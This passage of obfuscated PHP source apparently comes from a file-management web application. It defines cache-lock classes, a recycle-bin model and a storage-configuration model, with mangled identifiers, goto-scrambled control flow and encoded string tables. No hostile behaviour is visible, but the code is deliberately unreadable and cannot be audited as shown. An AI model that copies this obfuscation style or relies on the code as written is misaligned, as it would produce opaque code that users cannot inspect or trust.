array_to_keyvalue_group($f‚Ò•ÉÔì˜, $cµ‰Ìš[1732]); foreach ($f‚Ò•ÉÔì˜ as $DœæêìŒ­Ú => $ašÁ‚Â°•õ) { $B÷À“Õ¨½ = array(); foreach ($ašÁ‚Â°•õ as $dğ£ñÎö) { $B÷À“Õ¨½[$dğ£ñÎö[$cµ‰Ìš[103]]] = $dğ£ñÎö[$cµ‰Ìš[381]]; } $f‚Ò•ÉÔì˜[$DœæêìŒ­Ú] = $B÷À“Õ¨½; } goto dÑ‹Àº´¦Ä; f•…×ğÖİ: } } goto EÖ²øø‚™Í; FÆäšèÃãŞ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c†İÏÂÕÆå; aƒø˜£«Áİ: self::$timeout = $eÃ¿É‡„ùÊ[$ešÜÁÇŸ²ğ[814]] ? $eÃ¿É‡„ùÊ[$ešÜÁÇŸ²ğ[814]] : 10; $D¦Éòºö÷‹ = _get($GLOBALS[$ešÜÁÇŸ²ğ[6]], $ešÜÁÇŸ²ğ[815]); $cñéì‚¿ÜÏ = $eÃ¿É‡„ùÊ[$ešÜÁÇŸ²ğ[801]] ? $eÃ¿É‡„ùÊ[$ešÜÁÇŸ²ğ[801]] : $ešÜÁÇŸ²ğ[203]; goto f¹ë¹ôÎİ; c†İÏÂÕÆå: $ešÜÁÇŸ²ğ =& $_SERVER[Ü˜]; if (self::$handle) { return self::$handle; } $eÃ¿É‡„ùÊ = $GLOBALS[$ešÜÁÇŸ²ğ[6]][$ešÜÁÇŸ²ğ[356]]; goto aƒø˜£«Áİ; f¹ë¹ôÎİ: if ($cñéì‚¿ÜÏ == $ešÜÁÇŸ²ğ[17] && $D¦Éòºö÷‹ == $ešÜÁÇŸ²ğ[9]) { $cñéì‚¿ÜÏ = $ešÜÁÇŸ²ğ[203]; } switch ($cñéì‚¿ÜÏ) { case $ešÜÁÇŸ²ğ[804]: self::$handle = new CacheLockRedis(); break; case $ešÜÁÇŸ²ğ[805]: self::$handle = new CacheLockMemcached(); break; case $ešÜÁÇŸ²ğ[17]: self::$handle = new CacheLockDatabase(); break; case $ešÜÁÇŸ²ğ[203]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto cÖÆ´ÊŒôò; cÖÆ´ÊŒôò: } private static function key($bóŒùŒË­ø) { return $_SERVER[Ü˜][816] . Cache::key($bóŒùŒË­ø); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($aµÀé¡•Õ = '') { self::$errorMsg = $aµÀé¡•Õ; } public static function lockGlobal($FÉ‰Ü§„•–, $C¹ß™½£×Ø) { return self::lock($FÉ‰Ü§„•–, $C¹ß™½£×Ø, !0); } public static function lock($BÍ¨˜Ş÷Ğ, $c–§‘²ƒ¿Î = false, $Cø‡·£¯Ú‹ = false) { goto EòÂÛ„‰ÛË; d‘‰¢Š£: if (!$Cø‡·£¯Ú‹) { self::$lockItem[$D°ÂƒÂÆìò] = !0; } return $dî«ÕŒãŠ; goto Bçµéİ–ù¯; EòÂÛ„‰ÛË: $d“¢Ğê‡³ =& $_SERVER[Ü˜]; $BğÈ¢Ê¥Æ = self::init(); $D°ÂƒÂÆìò = self::key($BÍ¨˜Ş÷Ğ); goto E®§è¬²Ø…; E®§è¬²Ø…: $c–§‘²ƒ¿Î = $c–§‘²ƒ¿Î ? $c–§‘²ƒ¿Î : self::$timeout; $dî«ÕŒãŠ = $BğÈ¢Ê¥Æ->lock($D°ÂƒÂÆìò, $c–§‘²ƒ¿Î); if (!$dî«ÕŒãŠ) { $D†Ç¦ŸöÙ = "\154\157\x63\153\40\x65\162\x72\x6f\162\x3b\153\145\171\x3d{$BÍ¨˜Ş÷Ğ}\x3b\164\151\x6d\145\75{$c–§‘²ƒ¿Î}\73" . self::$errorMsg . $d“¢Ğê‡³[78] . get_caller_msg(); $f”ˆß Ú¾ = LNG($d“¢Ğê‡³[817]) . "\50{$c–§‘²ƒ¿Î}\x73\x29\x2e" . LNG($d“¢Ğê‡³[818]); $f”ˆß Ú¾ .= $d“¢Ğê‡³[819]; if (is_string(self::$errorMsg) && self::$errorMsg) { $f”ˆß Ú¾ = $f”ˆß Ú¾ . $d“¢Ğê‡³[820] . self::$errorMsg; } write_log($D†Ç¦ŸöÙ, $d“¢Ğê‡³[821]); show_json($f”ˆß Ú¾, !1); } goto d‘‰¢Š£; Bçµéİ–ù¯: } public static function lockGet($cÀ™Ñ†¨Ø) { $F¢Á…£äÜã = self::key($cÀ™Ñ†¨Ø); if (self::$lockItem[$F¢Á…£äÜã]) { return self::$lockItem[$F¢Á…£äÜã]; } return self::init()->lockGet($F¢Á…£äÜã); } public static function unlock($cÄÅ‹¯Ù»Ê) { $cÜÚ™’ÀÍ = self::key($cÄÅ‹¯Ù»Ê); self::$lockItem[$cÜÚ™’ÀÍ] = null; return self::init()->unlock($cÜÚ™’ÀÍ); } public static function unlockRuntime() { $a¸Õƒ®ÎÁê =& $_SERVER[Ü˜]; $EÚãº˜Ù›ì = self::init(); $A¼†ÜÏ«Ö£ = !1; foreach (self::$lockItem as $aè¨¡ÑŒñ => $dİ ĞÛšøå) { if (!$dİ ĞÛšøå) { continue; } $EÚãº˜Ù›ì->unlock($aè¨¡ÑŒñ); if (!$A¼†ÜÏ«Ö£) { $A¼†ÜÏ«Ö£ = !0; write_log($a¸Õƒ®ÎÁê[822] . $aè¨¡ÑŒñ . $a¸Õƒ®ÎÁê[78] . get_caller_msg(), $a¸Õƒ®ÎÁê[821]); continue; } write_log($a¸Õƒ®ÎÁê[822] . $aè¨¡ÑŒñ, $a¸Õƒ®ÎÁê[821]); } self::fileUnlockAll(); } public static function fileLock($CÍÄµºóï) { goto D°ßÒß™ªŠ; E¤ã¥Öµ : $Aö“ˆ£›¨ = fopen(DATA_PATH . $CÍÄµºóï . $dóäì—Ô™·[824], $dóäì—Ô™·[825]); if (!$Aö“ˆ£›¨) { return !1; } $GLOBALS[$dóäì—Ô™·[823]][$CÍÄµºóï] = $Aö“ˆ£›¨; goto Dè˜İÊ“´µ; f¨ø˜‡¦ˆ‘: return !1; goto BÀê–ØùŸ; D°ßÒß™ªŠ: $dóäì—Ô™· =& $_SERVER[Ü˜]; if (!$GLOBALS[$dóäì—Ô™·[823]]) { $GLOBALS[$dóäì—Ô™·[823]] = array(); } $GLOBALS[$dóäì—Ô™·[823]][$CÍÄµºóï] = !1; goto E¤ã¥Öµ ; Dè˜İÊ“´µ: if (flock($Aö“ˆ£›¨, LOCK_EX)) { return !0; } self::unlock($CÍÄµºóï); show_json($dóäì—Ô™·[826], !1); goto f¨ø˜‡¦ˆ‘; BÀê–ØùŸ: } public static function fileUnlock($aÂæÁêî½) { $dí†ÃÂ†ÊÛ =& $_SERVER[Ü˜]; $dµµÇ‰Š = $GLOBALS[$dí†ÃÂ†ÊÛ[823]][$aÂæÁêî½]; if (!$dµµÇ‰Š) { return; } $GLOBALS[$dí†ÃÂ†ÊÛ[823]][$aÂæÁêî½] = !1; flock($dµµÇ‰Š, LOCK_UN); fclose($dµµÇ‰Š); } public static function fileUnlockAll() { $DŞé¡ÚÜù™ =& $_SERVER[Ü˜]; if (!$GLOBALS[$DŞé¡ÚÜù™[823]]) { return; } foreach ($GLOBALS[$DŞé¡ÚÜù™[823]] as $A§Š¯…¤¼î => $déÈÖ”Ì¹Ò) { if (!$déÈÖ”Ì¹Ò) { continue; } $GLOBALS[$DŞé¡ÚÜù™[823]][$A§Š¯…¤¼î] = !1; flock($déÈÖ”Ì¹Ò, LOCK_UN); fclose($déÈÖ”Ì¹Ò); } $GLOBALS[$DŞé¡ÚÜù™[823]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $bï‡†Ñò‚ô =& $_SERVER[Ü˜]; $Eó‘¹¶†ìÓ = $GLOBALS[$bï‡†Ñò‚ô[6]][$bï‡†Ñò‚ô[356]]; self::$cachePath = $Eó‘¹¶†ìÓ[$bï‡†Ñò‚ô[203]][$bï‡†Ñò‚ô[86]]; @mkdir(self::$cachePath, 511, !0); } public function lock($DÂ¼£Ù·Î, $dÈóù›ùï‚ = 0) { goto cÁ½Á¯»Õ®; dî¨âñŒŒœ: $CÈŠ¶îïÍ¢ = rtrim(self::$cachePath, $C×Šæ‡‹ØÖ[8]) . $C×Šæ‡‹ØÖ[827] . md5($DÂ¼£Ù·Î) . $C×Šæ‡‹ØÖ[824]; if (file_exists($CÈŠ¶îïÍ¢) && filemtime($CÈŠ¶îïÍ¢) && filemtime($CÈŠ¶îïÍ¢) < time() - 10) { @unlink($CÈŠ¶îïÍ¢); } do { if (file_exists($CÈŠ¶îïÍ¢)) { cacheLockWait(); continue; } $e¿¥‡Š¥Õ¬ = fopen($CÈŠ¶îïÍ¢, $C×Šæ‡‹ØÖ[828]); if (!$e¿¥‡Š¥Õ¬) { return !1; } $Bã‰»óÅ = flock($e¿¥‡Š¥Õ¬, LOCK_EX | LOCK_NB); self::$caches[$DÂ¼£Ù·Î] = array($C×Šæ‡‹ØÖ[829] => $e¿¥‡Š¥Õ¬, $C×Šæ‡‹ØÖ[203] => $CÈŠ¶îïÍ¢); fwrite($e¿¥‡Š¥Õ¬, $dŒ¥‹˜¨Øó); clearstatcache(); if ($e¿¥‡Š¥Õ¬ && $Bã‰»óÅ) { return !0; } cacheLockWait(); } while (microtime(!0) < $dŒ¥‹˜¨Øó); goto d‘±Ïù¶¯ˆ; d‘±Ïù¶¯ˆ: $this->unlock($DÂ¼£Ù·Î); return !1; goto fŞŠÔŞ‘Õˆ; cÁ½Á¯»Õ®: $C×Šæ‡‹ØÖ =& $_SERVER[Ü˜]; $CâŞ°Õ…²Â = microtime(!0); $dŒ¥‹˜¨Øó = $CâŞ°Õ…²Â + $dÈóù›ùï‚ + 0.0001; goto dî¨âñŒŒœ; fŞŠÔŞ‘Õˆ: } public function lockGet($cìÛæ¹Ë´) { $A«Á©©éÓÀ =& $_SERVER[Ü˜]; $Fíò›è·¯™ = rtrim(self::$cachePath, $A«Á©©éÓÀ[8]) . $A«Á©©éÓÀ[827] . md5($cìÛæ¹Ë´) . $A«Á©©éÓÀ[824]; return file_exists($Fíò›è·¯™); } public function unlock($fÂ–ÍéÒ´Ã) { goto aÊœÚ”ƒ¶Ä; aÊœÚ”ƒ¶Ä: $eó¢ ®ÌÖ =& $_SERVER[Ü˜]; $AÉÚçâÆÓ¾ = self::$caches[$fÂ–ÍéÒ´Ã]; if (!$AÉÚçâÆÓ¾) { return; } goto B‰ˆÑ Õ‘; BÏÍÇÄ„ØÆ: unset(self::$caches[$fÂ–ÍéÒ´Ã]); goto bÙïç™ÓùÛ; B‰ˆÑ Õ‘: @flock($AÉÚçâÆÓ¾[$eó¢ ®ÌÖ[829]], LOCK_UN); @fclose($AÉÚçâÆÓ¾[$eó¢ ®ÌÖ[829]]); @unlink($AÉÚçâÆÓ¾[$eó¢ ®ÌÖ[203]]); goto BÏÍÇÄ„ØÆ; bÙïç™ÓùÛ: } } goto eÇ‰Ãï¾Í; eœîÖ·§Å: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\143\x65\x5f\162\145\x63\171\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\124\x69\x6d\145", "\x74\x69\x6d\145", "\151\x6e\163\x65\162\x74", "\x66\165\x6e\x63\164\x69\157\x6e")); public function listData($E¼Û¢šï = false) { $c‰âõ”É”Ø =& $_SERVER[Ü˜]; $E¼Û¢šï = $E¼Û¢šï ? $E¼Û¢šï : USER_ID; $C‰ï“‹ñçË = $this->where(array($c‰âõ”É”Ø[1521] => $E¼Û¢šï))->select(); return array_to_keyvalue($C‰ï“‹ñçË, $c‰âõ”É”Ø[33], $c‰âõ”É”Ø[404]); } public function moveToRecycle($f—”ˆ©…‡Ì) { goto c³‚”ø¨…å; Dù¼í¾«ˆ: if (!$dáÎ¾¸Ë¤ || $dáÎ¾¸Ë¤[$AãÖË¢˜ï[432]] == $AãÖË¢˜ï[97]) { return; } $b©‘Îª³÷Õ = array($AãÖË¢˜ï[419] => $f—”ˆ©…‡Ì, $AãÖË¢˜ï[1521] => USER_ID, $AãÖË¢˜ï[558] => $dáÎ¾¸Ë¤[$AãÖË¢˜ï[413]], $AãÖË¢˜ï[559] => $dáÎ¾¸Ë¤[$AãÖË¢˜ï[493]], $AãÖË¢˜ï[562] => $dáÎ¾¸Ë¤[$AãÖË¢˜ï[496]]); $this->add($b©‘Îª³÷Õ); goto FèŠîŸÑ; FèŠîŸÑ: $this->recycleMove($f—”ˆ©…‡Ì, 1); if ($dáÎ¾¸Ë¤[$AãÖË¢˜ï[412]] == $AãÖË¢˜ï[97]) { $dê“‹©§Å = array($AãÖË¢˜ï[562] => array($AãÖË¢˜ï[521], $dáÎ¾¸Ë¤[$AãÖË¢˜ï[496]] . $f—”ˆ©…‡Ì . $AãÖË¢˜ï[522])); $AİÓ¢‘‡éÃ->where($dê“‹©§Å)->setField($AãÖË¢˜ï[432], 1); } goto E¤·˜–õ¾; c³‚”ø¨…å: $AãÖË¢˜ï =& $_SERVER[Ü˜]; $AİÓ¢‘‡éÃ = Model($AãÖË¢˜ï[1207]); $dáÎ¾¸Ë¤ = $AİÓ¢‘‡éÃ->sourceInfo($f—”ˆ©…‡Ì); goto Dù¼í¾«ˆ; E¤·˜–õ¾: } public function clear() { $this->remove(!1); } public function remove($A¡èÂ¹ä‰­ = false, $DŞ£ì£°• = false) { goto Aî£İİÆÑÍ; dïÃÃˆ ¬×: $E‰‰œí…Á• = $this->listData($DŞ£ì£°•); $A¡èÂ¹ä‰­ = $A¡èÂ¹ä‰­ === !1 ? !1 : $A¡èÂ¹ä‰­; $f¦Æ¨»Ë²é = array(); goto a¼ ’ÙíÔÑ; a¼ ’ÙíÔÑ: foreach ($E‰‰œí…Á• as $còêÛÁôîĞ) { if ($A¡èÂ¹ä‰­ != !1 && !in_array($còêÛÁôîĞ, $A¡èÂ¹ä‰­)) { continue; } $B¿Ò°êîºê = $cùÇ±²ÅÚ¬->sourceInfo($còêÛÁôîĞ); $cùÇ±²ÅÚ¬->remove($còêÛÁôîĞ, !1); $f—“óƒ½—« = $B¿Ò°êîºê[$ašæ¹ö°•[413]] . $ašæ¹ö°•[81] . $B¿Ò°êîºê[$ašæ¹ö°•[493]]; $f¦Æ¨»Ë²é[$f—“óƒ½—«] = array($ašæ¹ö°•[558] => $B¿Ò°êîºê[$ašæ¹ö°•[413]], $ašæ¹ö°•[493] => $B¿Ò°êîºê[$ašæ¹ö°•[493]]); $this->where(array($ašæ¹ö°•[404] => $còêÛÁôîĞ))->delete(); } foreach ($f¦Æ¨»Ë²é as $Dø¦òïÌğ) { $cùÇ±²ÅÚ¬->targetSpaceUpdate($Dø¦òïÌğ[$ašæ¹ö°•[413]], $Dø¦òïÌğ[$ašæ¹ö°•[493]]); } goto C¢‰ÀÊç¹ß; Aî£İİÆÑÍ: $ašæ¹ö°• =& $_SERVER[Ü˜]; $DŞ£ì£°• = $DŞ£ì£°• ? $DŞ£ì£°• : USER_ID; $cùÇ±²ÅÚ¬ = Model($ašæ¹ö°•[1207]); goto dïÃÃˆ ¬×; C¢‰ÀÊç¹ß: } public function restore($Eë“˜ø±¡ã = false) { $AôÏÖÔß»¨ = $this->listData(); $this->_restoreSource($AôÏÖÔß»¨, $Eë“˜ø±¡ã); } public function removeUserAll($dÃĞ£ÚÏ¹…) { $this->remove(!1, $dÃĞ£ÚÏ¹…); } private function _restoreSource($f ¿ø‚‡¥Ä, $BÌŒÔ½ŠÀ) { goto f„„´°›ø; c÷ò×Ä½šÕ: $BÕÒÎ¯ÑÈÃ->updateModifyTime($A®•‘¶ ³Ğ); goto FÃ„¼À«; a•È³ÓÅá: if (!$f ¿ø‚‡¥Ä) { return !0; } $A®•‘¶ ³Ğ = array(); foreach ($f ¿ø‚‡¥Ä as $EŒí– Õµ•) { goto F¿Šî¼Â…Š; BèØ½«„Áç: $A®•‘¶ ³Ğ[] = $Bœ‰·¢°ì[$eÕìÃƒ¿¡[487]]; if ($Bœ‰·¢°ì[$eÕìÃƒ¿¡[412]] == $eÕìÃƒ¿¡[97]) { $A®•‘¶ ³Ğ[] = $EŒí– Õµ•; } $BÕÒÎ¯ÑÈÃ->lockMoveEnd($EŒí– Õµ•); goto c ÄØÏ„ƒé; eÉ¬‰‘›óª: if ($Bœ‰·¢°ì[$eÕìÃƒ¿¡[412]] == $eÕìÃƒ¿¡[97]) { $EÑ ‚éâî = array($eÕìÃƒ¿¡[562] => array($eÕìÃƒ¿¡[521], $Bœ‰·¢°ì[$eÕìÃƒ¿¡[496]] . $EŒí– Õµ• . $eÕìÃƒ¿¡[522])); $BÕÒÎ¯ÑÈÃ->where($EÑ ‚éâî)->setField($eÕìÃƒ¿¡[432], 0); $this->restoreFolderChildren($EŒí– Õµ•, $f ¿ø‚‡¥Ä); } $this->where(array($eÕìÃƒ¿¡[404] => $EŒí– Õµ•))->delete(); $BÕÒÎ¯ÑÈÃ->folderSizeReset($Bœ‰·¢°ì[$eÕìÃƒ¿¡[487]]); goto BèØ½«„Áç; bì‘‡¯Ğ†: if ($B‹“½åƒåï[$eÕìÃƒ¿¡[432]] == $eÕìÃƒ¿¡[97]) { continue; } $BÕÒÎ¯ÑÈÃ->lockMoveStart($EŒí– Õµ•); $this->recycleMove($EŒí– Õµ•, 0); goto eÉ¬‰‘›óª; F¿Šî¼Â…Š: if ($BÌŒÔ½ŠÀ != !1 && !in_array($EŒí– Õµ•, $BÌŒÔ½ŠÀ)) { continue; } $Bœ‰·¢°ì = $BÕÒÎ¯ÑÈÃ->sourceInfo($EŒí– Õµ•); $B‹“½åƒåï = $BÕÒÎ¯ÑÈÃ->sourceInfo($Bœ‰·¢°ì[$eÕìÃƒ¿¡[487]]); goto bì‘‡¯Ğ†; c ÄØÏ„ƒé: } goto c÷ò×Ä½šÕ; f„„´°›ø: $eÕìÃƒ¿¡ =& $_SERVER[Ü˜]; $BÕÒÎ¯ÑÈÃ = Model($eÕìÃƒ¿¡[1207]); $BÌŒÔ½ŠÀ = $BÌŒÔ½ŠÀ == !1 ? !1 : $BÌŒÔ½ŠÀ; goto a•È³ÓÅá; FÃ„¼À«: } private function restoreFolderChildren($D¯ÅÁÔÕ, $B†Ê†£ˆÓÌ) { goto FÊŒ”°¶ù; FÊŒ”°¶ù: $Dß¥ßÜİ¢ =& $_SERVER[Ü˜]; $Fßéñ†ìË = Model($Dß¥ßÜİ¢[1207]); $C–ªÕ„Ì‘ç = array($Dß¥ßÜİ¢[404] => array($Dß¥ßÜİ¢[7], array())); goto Aï«¯Ğßë; aë¯Ğéùï: $C–ªÕ„Ì‘ç[$Dß¥ßÜİ¢[404]][1] = array_unique($C–ªÕ„Ì‘ç[$Dß¥ßÜİ¢[404]][1]); $C–ªÕ„Ì‘ç[$Dß¥ßÜİ¢[958]] = $Dß¥ßÜİ¢[1780]; $Fßéñ†ìË->where($C–ªÕ„Ì‘ç)->setField($Dß¥ßÜİ¢[432], 1); goto F•µÜíÏì; Aï«¯Ğßë: foreach ($B†Ê†£ˆÓÌ as $f–ÑÕØİšğ) { if ($f–ÑÕØİšğ == $D¯ÅÁÔÕ) { continue; } if (!$Fßéñ†ìË->isParentOf($D¯ÅÁÔÕ, $f–ÑÕØİšğ)) { continue; } $Eš¶öõ«¬Š = $Fßéñ†ìË->sourceInfo($f–ÑÕØİšğ); if ($Eš¶öõ«¬Š[$Dß¥ßÜİ¢[412]] == $Dß¥ßÜİ¢[97]) { $C–ªÕ„Ì‘ç[] = array($Dß¥ßÜİ¢[562] => array($Dß¥ßÜİ¢[521], $Eš¶öõ«¬Š[$Dß¥ßÜİ¢[496]] . $f–ÑÕØİšğ . $Dß¥ßÜİ¢[522])); } else { $C–ªÕ„Ì‘ç[$Dß¥ßÜİ¢[404]][1][] = $f–ÑÕØİšğ; } } if (!$C–ªÕ„Ì‘ç[$Dß¥ßÜİ¢[404]][1]) { unset($C–ªÕ„Ì‘ç[$Dß¥ßÜİ¢[404]]); } if (!$C–ªÕ„Ì‘ç) { return; } goto aë¯Ğéùï; F•µÜíÏì: } private function recycleMove($b›ññÛÄÙ­, $dÒÍºô„“ = 1) { $EØñÖˆĞ÷Ü =& $_SERVER[Ü˜]; $FØÙí‹‚À• = Model($EØñÖˆĞ÷Ü[1207]); $bù‹¬Ñ» = Model($EØñÖˆĞ÷Ü[1989]); $aâŞğ±¬Şª = array($EØñÖˆĞ÷Ü[404] => $b›ññÛÄÙ­); if ($dÒÍºô„“) { $FØÙí‹‚À•->where($aâŞğ±¬Şª)->setField($EØñÖˆĞ÷Ü[432], 1); $bù‹¬Ñ»->eventRecycle($b›ññÛÄÙ­, $EØñÖˆĞ÷Ü[1990]); } else { $A—á¹÷ë¾‘ = $FØÙí‹‚À•->where($aâŞğ±¬Şª)->find(); $dÈ† œ–ä = $A—á¹÷ë¾‘[$EØñÖˆĞ÷Ü[412]] == $EØñÖˆĞ÷Ü[97]; $bØçˆ‡öÏ = $FØÙí‹‚À•->fileNameAuto($A—á¹÷ë¾‘[$EØñÖˆĞ÷Ü[487]], $A—á¹÷ë¾‘[$EØñÖˆĞ÷Ü[28]], REPEAT_RENAME_FOLDER, $dÈ† œ–ä); if ($bØçˆ‡öÏ != $A—á¹÷ë¾‘[$EØñÖˆĞ÷Ü[28]]) { $FØÙí‹‚À•->rename($b›ññÛÄÙ­, $bØçˆ‡öÏ); } $FØÙí‹‚À•->where($aâŞğ±¬Şª)->setField($EØñÖˆĞ÷Ü[432], 0); $bù‹¬Ñ»->eventRecycle($b›ññÛÄÙ­, $EØñÖˆĞ÷Ü[1991]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\x73\x74\x6f\162\141\x67\145\114\x69\x73\x74"; public $field = array("\156\141\155\145", "\163\151\x7a\x65\115\x61\170", "\x73\x79\x73\164\x65\155", "\x64\145\146\141\x75\x6c\164", "\x64\x72\x69\166\145\162", "\143\157\156\146\x69\147"); public function listData($f¾¡¤ĞÛ‡ = false, $fÜ¢Ù˜´ß¹ = "\x6d\157\144\x69\x66\x79\x54\151\155\145", $b‡‰ÉÏ†˜’ = false) { $Aáëñ¨ŠŠ =& $_SERVER[Ü˜]; $dÁÇŠêğô‚ = parent::listData($f¾¡¤ĞÛ‡, $fÜ¢Ù˜´ß¹, $b‡‰ÉÏ†˜’); if ($f¾¡¤ĞÛ‡) { return $dÁÇŠêğô‚; } $Aé²ÒªÌÈó = $this->ioSizeUseGet(array_to_keyvalue($dÁÇŠêğô‚, $Aáëñ¨ŠŠ[33], $Aáëñ¨ŠŠ[402])); foreach ($dÁÇŠêğô‚ as $a‚ÜÔ‹Ê•† => $d¥ÊÒÛˆ”è) { unset($dÁÇŠêğô‚[$a‚ÜÔ‹Ê•†][$Aáëñ¨ŠŠ[6]]); $dÁÇŠêğô‚[$a‚ÜÔ‹Ê•†][$Aáëñ¨ŠŠ[1679]] = isset($Aé²ÒªÌÈó[$d¥ÊÒÛˆ”è[$Aáëñ¨ŠŠ[402]]]) ? $Aé²ÒªÌÈó[$d¥ÊÒÛˆ”è[$Aáëñ¨ŠŠ[402]]] : 0; } return $dÁÇŠêğô‚; } public function ioSizeUseGet($F“¸ïö ç) { goto E«§Ÿ–¨¾Ô; Bğ´çÍ¢ë: $DôÇÊß§¢Œ = Cache::get($aâÕÃ¹«Æ÷); if ($DôÇÊß§¢Œ) { return $DôÇÊß§¢Œ; } $e³Î°ºô = array($BÓ¡©‚¹¾[791] => $BÓ¡©‚¹¾[402], $BÓ¡©‚¹¾[1993] => $BÓ¡©‚¹¾[88]); goto b¸ô“šÕ±õ; b¸ô“šÕ±õ: $cÄÚ¬“¢¼Ğ = array($BÓ¡©‚¹¾[791] => array($BÓ¡©‚¹¾[7], $F“¸ïö ç)); $DôÇÊß§¢Œ = Model($BÓ¡©‚¹¾[756])->field($e³Î°ºô)->where($cÄÚ¬“¢¼Ğ)->group($BÓ¡©‚¹¾[791])->select(); $DôÇÊß§¢Œ = array_to_keyvalue($DôÇÊß§¢Œ, $BÓ¡©‚¹¾[402], $BÓ¡©‚¹¾[88]); goto DÀõ—¾ò—; E«§Ÿ–¨¾Ô: $BÓ¡©‚¹¾ =& $_SERVER[Ü˜]; if (!$F“¸ïö ç) { return array(); } $aâÕÃ¹«Æ÷ = $BÓ¡©‚¹¾[1992] . implode($BÓ¡©‚¹¾[47], $F“¸ïö ç); goto Bğ´çÍ¢ë; DÀõ—¾ò—: Cache::set($aâÕÃ¹«Æ÷, $DôÇÊß§¢Œ, 600); return $DôÇÊß§¢Œ; goto F›Áœ—ƒßƒ; F›Áœ—ƒßƒ: } public function getConfig($c†‹©«–¸‰) { $BÇë·äí²Ë = parent::listData($c†‹©«–¸‰); return json_decode($BÇë·äí²Ë[$_SERVER[Ü˜][6]], !0); } public function update($BêÜ¨ÑÉµœ, $E”¹’µ·“) { goto eÂ„íªêº¨; eÚé»ÕÔ±º: $C£Ä‡Ÿ´ïè = parent::update($BêÜ¨ÑÉµœ, $E”¹’µ·“); if ($C£Ä‡Ÿ´ïè && $E”¹’µ·“[$AÊî¸¢ƒÄç[34]]) { foreach ($FµĞ×ÖÂÓá as $b†ÕÜ¤í°ç) { if ($b†ÕÜ¤í°ç[$AÊî¸¢ƒÄç[34]] && $b†ÕÜ¤í°ç[$AÊî¸¢ƒÄç[402]] != $BêÜ¨ÑÉµœ) { parent::update($b†ÕÜ¤í°ç[$AÊî¸¢ƒÄç[402]], array($AÊî¸¢ƒÄç[34] => 0)); } } } return $C£Ä‡Ÿ´ïè; goto eçŞìËóíù; eÂ„íªêº¨: $AÊî¸¢ƒÄç =& $_SERVER[Ü˜]; $d’ïƒÌÙ‡Î = $E”¹’µ·“[$AÊî¸¢ƒÄç[28]]; $FµĞ×ÖÂÓá = array_to_keyvalue(parent::listData(), $AÊî¸¢ƒÄç[28]); goto Aã«Ê–Úç—; Aã«Ê–Úç—: if (isset($FµĞ×ÖÂÓá[$d’ïƒÌÙ‡Î]) && $FµĞ×ÖÂÓá[$d’ïƒÌÙ‡Î][$AÊî¸¢ƒÄç[402]] != $BêÜ¨ÑÉµœ) { return !1; } if (isset($E”¹’µ·“[$AÊî¸¢ƒÄç[1994]]) && $E”¹’µ·“[$AÊî¸¢ƒÄç[1994]] == $AÊî¸¢ƒÄç[97]) { $this->checkConfig($E”¹’µ·“); } unset($E”¹’µ·“[$AÊî¸¢ƒÄç[1994]]); goto eÚé»ÕÔ±º; eçŞìËóíù: } public function add($dœ…„øˆ) { goto e¡óŒæÍµÄ; B±“ª×—‡: $this->checkConfig($dœ…„øˆ); $eÛ·©£ˆÂ = parent::insert($dœ…„øˆ); if ($eÛ·©£ˆÂ && $dœ…„øˆ[$e­í˜ÎÂÆ‰[34]]) { foreach ($B‡ÍäÎˆº‹ as $a¼ Ô’»Ö¸) { if ($a¼ Ô’»Ö¸[$e­í˜ÎÂÆ‰[34]]) { parent::update($a¼ Ô’»Ö¸[$e­í˜ÎÂÆ‰[402]], array($e­í˜ÎÂÆ‰[34] => 0)); } } } goto CÇª–¡¶âª; e¡óŒæÍµÄ: $e­í˜ÎÂÆ‰ =& $_SERVER[Ü˜]; $B‡ÍäÎˆº‹ = array_to_keyvalue(parent::listData(), $e­í˜ÎÂÆ‰[28]); if (isset($B‡ÍäÎˆº‹[$dœ…„øˆ[$e­í˜ÎÂÆ‰[28]]])) { return !1; } goto B±“ª×—‡; CÇª–¡¶âª: return $eÛ·©£ˆÂ; goto dïÊ’ã¾–ó; dïÊ’ã¾–ó: } public function checkConfig(&$e«´¹¯Œ¬, $dçÔŸÇ»Åö = false) { goto cßÂö‡—ŠŸ; d²ËË®¡±: $c˜“Í…²œ = isset($a´×ê²ªš[$a™ÃÃè”ïï]) ? $a´×ê²ªš[$a™ÃÃè”ïï] : ucfirst($a™ÃÃè”ïï); $c¿ƒÎÖãáî = $F±Ş¢Œåß•[82] . $c˜“Í…²œ; if (!$c˜“Í…²œ || !class_exists($c¿ƒÎÖãáî)) { if ($dçÔŸÇ»Åö) { return LNG($F±Ş¢Œåß•[1996]); } write_log(array($F±Ş¢Œåß•[1997], $e«´¹¯Œ¬, get_caller_info()), $F±Ş¢Œåß•[1998]); show_json(LNG($F±Ş¢Œåß•[1996]), !1, $e«´¹¯Œ¬); } goto E²¶äŒÖ—ß; B¨ »Ì²¹‹: $e«´¹¯Œ¬[$F±Ş¢Œåß•[6]] = json_encode($cÁš®·ÒçÃ); $e«´¹¯Œ¬[$F±Ş¢Œåß•[104]] = $c˜“Í…²œ; return !0; goto f®ˆ‚ù—Ï; E²¶äŒÖ—ß: $dçê×ÛŒÈé = new $c¿ƒÎÖãáî($cÁš®·ÒçÃ); if (in_array($a™ÃÃè”ïï, $dçê×ÛŒÈé->objectDriver)) { if (!$dçê×ÛŒÈé->isBucketCors() && !$dçê×ÛŒÈé->setBucketCors()) { $CÇòÄ¸Ñ• = LNG($F±Ş¢Œåß•[1999]); $CÇòÄ¸Ñ• .= $F±Ş¢Œåß•[2000] . LNG($F±Ş¢Œåß•[2001]); if ($dçÔŸÇ»Åö) { return $CÇòÄ¸Ñ•; } show_json($CÇòÄ¸Ñ•, !1); } } $cÜŠ¦ÁÅù = rtrim($cÁš®·ÒçÃ[$F±Ş¢Œåß•[1077]], $F±Ş¢Œåß•[8]) . $F±Ş¢Œåß•[8]; goto C… ã¡Øò; C… ã¡Øò: $BÈÇ©Ú†…¬ = $dçê×ÛŒÈé->getPath($cÜŠ¦ÁÅù . $F±Ş¢Œåß•[1139]); if 